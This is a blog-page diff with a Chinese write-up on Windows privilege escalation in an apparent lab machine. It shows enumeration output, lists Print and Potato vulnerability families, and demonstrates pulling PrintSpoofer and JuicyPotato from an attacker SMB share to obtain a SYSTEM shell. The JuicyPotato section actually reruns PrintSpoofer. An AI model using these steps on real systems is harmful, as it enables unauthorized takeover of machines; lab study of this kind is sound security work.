@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="枚举 systeminfo c:\windows\system32\inetsrv&gt;systeminfo systeminfo Host Name: JSON OS Name: Microsoft Windows Server 2012 R2 Datacenter OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-80005-00001-AA602 Original Install Date: 5/22/2019, 4:27:16 PM System Boot Time: 3/1/2026, 8:27:41 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 11/12/2020 Windows Directory: C:\Windows System Directory: C:\Windows\system32 Boot Device: \Device\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: es-mx;Spanish (Mexico) Time Zone: (UTC-05:00) Eastern Time (US &amp; Canada) Total Physical Memory: 8,191 MB Available Physical Memory: 7,535 MB Virtual Memory: Max Size: 9,471 MB Virtual Memory: Available: 8,808 MB Virtual Memory: In Use: 663 MB Page File Location(s): C:\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 2 DHCP Enabled: Yes DHCP Server: 10.10.10.2 IP address(es) [01]: 10.129.227.191 [02]: fe80::f19f:1378:66b2:439f [03]: dead:beef::f19f:1378:66b2:439f [04]: dead:beef::4f Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. OS Name：系统版本 OS Version：内核版本 Hotfix(s)：补丁安装情况 Tasklist 查看 PID。
+" />
+<meta name="keywords" content=", Hack" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/posts/windows-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/" />
+
+
+    <title>
+        
+            Windows 提权专区 :: Welcome My Hack&#39;s Blog 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.ab5336003ba331300318b49292c672210905baf1ef5410a739f647e70c8808fa.css" integrity="sha256-q1M2ADujMTADGLSSksZyIQkFuvHvVBCnOfZH5wyICPo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Windows 提权专区">
+  <meta itemprop="description" content="枚举 systeminfo c:\windows\system32\inetsrv&gt;systeminfo systeminfo Host Name: JSON OS Name: Microsoft Windows Server 2012 R2 Datacenter OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-80005-00001-AA602 Original Install Date: 5/22/2019, 4:27:16 PM System Boot Time: 3/1/2026, 8:27:41 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 11/12/2020 Windows Directory: C:\Windows System Directory: C:\Windows\system32 Boot Device: \Device\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: es-mx;Spanish (Mexico) Time Zone: (UTC-05:00) Eastern Time (US &amp; Canada) Total Physical Memory: 8,191 MB Available Physical Memory: 7,535 MB Virtual Memory: Max Size: 9,471 MB Virtual Memory: Available: 8,808 MB Virtual Memory: In Use: 663 MB Page File Location(s): C:\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 2 DHCP Enabled: Yes DHCP Server: 10.10.10.2 IP address(es) [01]: 10.129.227.191 [02]: fe80::f19f:1378:66b2:439f [03]: dead:beef::f19f:1378:66b2:439f [04]: dead:beef::4f Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. OS Name：系统版本 OS Version：内核版本 Hotfix(s)：补丁安装情况 Tasklist 查看 PID。">
+  <meta itemprop="datePublished" content="2026-03-02T14:00:00+08:00">
+  <meta itemprop="dateModified" content="2026-03-02T14:00:00+08:00">
+  <meta itemprop="wordCount" content="572">
+  <meta itemprop="keywords" content="Hack">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Windows 提权专区">
+  <meta name="twitter:description" content="枚举 systeminfo c:\windows\system32\inetsrv&gt;systeminfo systeminfo Host Name: JSON OS Name: Microsoft Windows Server 2012 R2 Datacenter OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-80005-00001-AA602 Original Install Date: 5/22/2019, 4:27:16 PM System Boot Time: 3/1/2026, 8:27:41 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 11/12/2020 Windows Directory: C:\Windows System Directory: C:\Windows\system32 Boot Device: \Device\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: es-mx;Spanish (Mexico) Time Zone: (UTC-05:00) Eastern Time (US &amp; Canada) Total Physical Memory: 8,191 MB Available Physical Memory: 7,535 MB Virtual Memory: Max Size: 9,471 MB Virtual Memory: Available: 8,808 MB Virtual Memory: In Use: 663 MB Page File Location(s): C:\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 2 DHCP Enabled: Yes DHCP Server: 10.10.10.2 IP address(es) [01]: 10.129.227.191 [02]: fe80::f19f:1378:66b2:439f [03]: dead:beef::f19f:1378:66b2:439f [04]: dead:beef::4f Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. OS Name：系统版本 OS Version：内核版本 Hotfix(s)：补丁安装情况 Tasklist 查看 PID。">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2026-03-02 14:00:00 &#43;0800 CST" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/english-articles/">English Articles</a></li><li><a href="/long-articles/">长文章</a></li><li><a href="/posts/">文章</a></li><li><a href="/tags/">标签</a></li><li><a href="/tools/">工具专区</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        3 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="http://localhost:1313/posts/windows-%E6%8F%90%E6%9D%83%E4%B8%93%E5%8C%BA/">Windows 提权专区</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#枚举">枚举</a>
+      <ul>
+        <li><a href="#systeminfo">systeminfo</a></li>
+        <li><a href="#tasklist">Tasklist</a></li>
+        <li><a href="#whoami-priv">Whoami /priv</a></li>
+      </ul>
+    </li>
+    <li><a href="#print-系列漏洞">Print 系列漏洞</a></li>
+    <li><a href="#土豆系列漏洞">土豆系列漏洞</a></li>
+    <li><a href="#提权演示">提权演示</a>
+      <ul>
+        <li><a href="#printspoofer">PrintSpoofer</a></li>
+        <li><a href="#juciepotato">JuciePotato</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <h2 id="枚举">枚举</h2>
+<h3 id="systeminfo">systeminfo</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;systeminfo
+</span></span><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host Name:                 JSON
+</span></span><span style="display:flex;"><span>OS Name:                   Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter
+</span></span><span style="display:flex;"><span>OS Version:                6.3.9600 N/A Build <span style="color:#ae81ff">9600</span>
+</span></span><span style="display:flex;"><span>OS Manufacturer:           Microsoft Corporation
+</span></span><span style="display:flex;"><span>OS Configuration:          Standalone Server
+</span></span><span style="display:flex;"><span>OS Build Type:             Multiprocessor Free
+</span></span><span style="display:flex;"><span>Registered Owner:          Windows User
+</span></span><span style="display:flex;"><span>Registered Organization:   
+</span></span><span style="display:flex;"><span>Product ID:                00252-80005-00001-AA602
+</span></span><span style="display:flex;"><span>Original Install Date:     5/22/2019, 4:27:16 PM
+</span></span><span style="display:flex;"><span>System Boot Time:          3/1/2026, 8:27:41 PM
+</span></span><span style="display:flex;"><span>System Manufacturer:       VMware, Inc.
+</span></span><span style="display:flex;"><span>System Model:              VMware Virtual Platform
+</span></span><span style="display:flex;"><span>System Type:               x64-based PC
+</span></span><span style="display:flex;"><span>Processor<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:              <span style="color:#ae81ff">2</span> Processor<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Installed.
+</span></span><span style="display:flex;"><span>                           <span style="color:#f92672">[</span>01<span style="color:#f92672">]</span>: AMD64 Family <span style="color:#ae81ff">23</span> Model <span style="color:#ae81ff">49</span> Stepping <span style="color:#ae81ff">0</span> AuthenticAMD ~2994 Mhz
+</span></span><span style="display:flex;"><span>                           <span style="color:#f92672">[</span>02<span style="color:#f92672">]</span>: AMD64 Family <span style="color:#ae81ff">23</span> Model <span style="color:#ae81ff">49</span> Stepping <span style="color:#ae81ff">0</span> AuthenticAMD ~2994 Mhz
+</span></span><span style="display:flex;"><span>BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
+</span></span><span style="display:flex;"><span>Windows Directory:         C:<span style="color:#ae81ff">\W</span>indows
+</span></span><span style="display:flex;"><span>System Directory:          C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32
+</span></span><span style="display:flex;"><span>Boot Device:               <span style="color:#ae81ff">\D</span>evice<span style="color:#ae81ff">\H</span>arddiskVolume1
+</span></span><span style="display:flex;"><span>System Locale:             en-us;English <span style="color:#f92672">(</span>United States<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Input Locale:              es-mx;Spanish <span style="color:#f92672">(</span>Mexico<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time Zone:                 <span style="color:#f92672">(</span>UTC-05:00<span style="color:#f92672">)</span> Eastern Time <span style="color:#f92672">(</span>US &amp; Canada<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Total Physical Memory:     8,191 MB
+</span></span><span style="display:flex;"><span>Available Physical Memory: 7,535 MB
+</span></span><span style="display:flex;"><span>Virtual Memory: Max Size:  9,471 MB
+</span></span><span style="display:flex;"><span>Virtual Memory: Available: 8,808 MB
+</span></span><span style="display:flex;"><span>Virtual Memory: In Use:    <span style="color:#ae81ff">663</span> MB
+</span></span><span style="display:flex;"><span>Page File Location<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:     C:<span style="color:#ae81ff">\p</span>agefile.sys
+</span></span><span style="display:flex;"><span>Domain:                    WORKGROUP
+</span></span><span style="display:flex;"><span>Logon Server:              N/A
+</span></span><span style="display:flex;"><span>Hotfix<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:                 N/A
+</span></span><span style="display:flex;"><span>Network Card<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:           <span style="color:#ae81ff">1</span> NIC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Installed.
+</span></span><span style="display:flex;"><span>                           <span style="color:#f92672">[</span>01<span style="color:#f92672">]</span>: vmxnet3 Ethernet Adapter
+</span></span><span style="display:flex;"><span>                                 Connection Name: Ethernet0 <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>                                 DHCP Enabled:    Yes
+</span></span><span style="display:flex;"><span>                                 DHCP Server:     10.10.10.2
+</span></span><span style="display:flex;"><span>                                 IP address<span style="color:#f92672">(</span>es<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                                 <span style="color:#f92672">[</span>01<span style="color:#f92672">]</span>: 10.129.227.191
+</span></span><span style="display:flex;"><span>                                 <span style="color:#f92672">[</span>02<span style="color:#f92672">]</span>: fe80::f19f:1378:66b2:439f
+</span></span><span style="display:flex;"><span>                                 <span style="color:#f92672">[</span>03<span style="color:#f92672">]</span>: dead:beef::f19f:1378:66b2:439f
+</span></span><span style="display:flex;"><span>                                 <span style="color:#f92672">[</span>04<span style="color:#f92672">]</span>: dead:beef::4f
+</span></span><span style="display:flex;"><span>Hyper-V Requirements:      A hypervisor has been detected. Features required <span style="color:#66d9ef">for</span> Hyper-V will not be displayed.
+</span></span></code></pre></div><ul>
+<li>OS Name：系统版本</li>
+<li>OS Version：内核版本</li>
+<li>Hotfix(s)：补丁安装情况</li>
+</ul>
+<h3 id="tasklist">Tasklist</h3>
+<p>查看 PID。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;tasklist | findstr <span style="color:#ae81ff">612</span>
+</span></span><span style="display:flex;"><span>tasklist | findstr <span style="color:#ae81ff">612</span>
+</span></span><span style="display:flex;"><span>FileZilla Server.exe           <span style="color:#ae81ff">612</span> Services                   <span style="color:#ae81ff">0</span>     10,432 K
+</span></span></code></pre></div><h3 id="whoami-priv">Whoami /priv</h3>
+<p>枚举当前用户权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;whoami /priv
+</span></span><span style="display:flex;"><span>whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                               State   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">========</span>
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Disabled
+</span></span><span style="display:flex;"><span>SeAuditPrivilege              Generate security audits                  Disabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</span></span></code></pre></div><h2 id="print-系列漏洞">Print 系列漏洞</h2>
+<ol>
+<li>PrintNIghtmare
+<ul>
+<li>滥用权限：SeLoadDriverPrivilege（特定情况），或者远程执行无需特殊权限</li>
+<li>描述：PrintNightmare 是一种漏洞，编号为 CVE-2021-34527，它影响了 Windows 的 <code>PrintSpooler</code> 服务，允许攻击者远程执行代码或者提升本地权限。虽然有些场景下需要 <code>SeloadDriverPrivilege</code> 来加载恶意驱动，但更多的时候是无权限限制的远程代码执行漏洞。</li>
+</ul>
+</li>
+<li>PrintSpoofer
+<ul>
+<li>滥用的权限：SelmpersonatePrivilege</li>
+<li>描述：PrintSpoofer 利用了  <code>Print Spooler</code> 服务中的漏洞，同样滥用 <code>SeImpersonatePrivilege</code>。该工具通过 <code>Impersonation</code> 提权，攻击者可以从低权限提高至 SYSTEM。</li>
+</ul>
+</li>
+<li>PrintDemon
+<ul>
+<li>滥用的权限：本地权限提升</li>
+<li>描述：PrintDemon（CVE-2020-1048）是一个 Windows 打印服务中的本地提权漏洞。它允许攻击者将恶意文件写入系统目录，从而实现代码执行或提权，此漏洞影响 Windows Print Spooler，攻击者可以通过操控打印队列中的临时文件来执行恶意操作。</li>
+</ul>
+</li>
+<li>CVE-2021-1675
+<ul>
+<li>滥用的权限：本地权限提升、远程代码执行</li>
+<li>描述：这是 PrintNightmare 另一个变体，攻击者通过 <code>Print Spooler</code> 服务在没有特别权限的情况下执行任意代码。</li>
+</ul>
+</li>
+<li>MS-RPRN
+<ul>
+<li>滥用的权限：远程代码执行</li>
+<li>描述：MS-RPRN 是 Windows 中的远程打印协议，该漏洞用于横向移动或远程代码执行。</li>
+</ul>
+</li>
+</ol>
+<h2 id="土豆系列漏洞">土豆系列漏洞</h2>
+<ol>
+<li>Rotten Potato
+<ul>
+<li>滥用的权限：SeImpersonatePribilege</li>
+<li>描述：Rotten Potato 利用了 Windows 中的 NTLM Relay 攻击，通过滥用具有 <code>SeImpersonatePribilege</code> 权限的进程来获取 SYSTEM 权限。</li>
+</ul>
+</li>
+<li>Jucie Potato
+<ul>
+<li>滥用的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</li>
+</ul>
+</li>
+<li>Rogue Potato
+<ul>
+<li>滥用的权限 ：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</li>
+</ul>
+</li>
+<li>Sweet Potato
+<ul>
+<li>滥用的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</li>
+</ul>
+</li>
+<li>Potato.exe
+<ul>
+<li>滥用的权限：SeImpersonatePrivilege</li>
+</ul>
+</li>
+<li>Smail Potato
+<ul>
+<li>滥用的权限：SeImpersonatePrivilege</li>
+</ul>
+</li>
+<li>Ghost Potato
+<ul>
+<li>滥用的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</li>
+</ul>
+</li>
+</ol>
+<h2 id="提权演示">提权演示</h2>
+<h3 id="printspoofer">PrintSpoofer</h3>
+<p>将 PrintSpoofer 传进靶机。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;cd c:<span style="color:#ae81ff">\p</span>rogramdata
+</span></span><span style="display:flex;"><span>cd c:<span style="color:#ae81ff">\p</span>rogramdata
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData&gt;mkdir apps
+</span></span><span style="display:flex;"><span>mkdir apps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData&gt;cd apps
+</span></span><span style="display:flex;"><span>cd apps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\P</span>rintSpoofer64.exe .<span style="color:#ae81ff">\P</span>rintSpoofer64.exe
+</span></span><span style="display:flex;"><span>copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\P</span>rintSpoofer64.exe .<span style="color:#ae81ff">\P</span>rintSpoofer64.exe
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> file<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> copied.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is AEF2-0DF2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/02/2026  03:00 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>03/02/2026  03:00 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>         27,136 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4,617,351,168 bytes free
+</span></span></code></pre></div><p>尝试执行提权。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;PrintSpoofer64.exe -i -c cmd.exe
+</span></span><span style="display:flex;"><span>PrintSpoofer64.exe -i -c cmd.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found privilege: SeImpersonatePrivilege
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Named pipe listening...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> CreateProcessAsUser<span style="color:#f92672">()</span> OK
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.3.9600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><h3 id="juciepotato">JuciePotato</h3>
+<p>将 JuicyPotato.exe 传入靶机。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\J</span>uicyPotato.exe .<span style="color:#ae81ff">\J</span>uicyPotato.exe
+</span></span><span style="display:flex;"><span>copy <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\J</span>uicyPotato.exe .<span style="color:#ae81ff">\J</span>uicyPotato.exe
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> file<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> copied.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is AEF2-0DF2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>03/02/2026  03:40 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>03/02/2026  03:40 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>12/06/2021  06:35 PM           347,648 JuicyPotato.exe
+</span></span><span style="display:flex;"><span>03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>        374,784 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4,617,109,504 bytes free
+</span></span></code></pre></div><p>利用提权。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>c:<span style="color:#ae81ff">\P</span>rogramData<span style="color:#ae81ff">\a</span>pps&gt;PrintSpoofer64.exe -i -c cmd.exe
+</span></span><span style="display:flex;"><span>PrintSpoofer64.exe -i -c cmd.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found privilege: SeImpersonatePrivilege
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Named pipe listening...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> CreateProcessAsUser<span style="color:#f92672">()</span> OK
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.3.9600<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div>
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/hack/">Hack</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
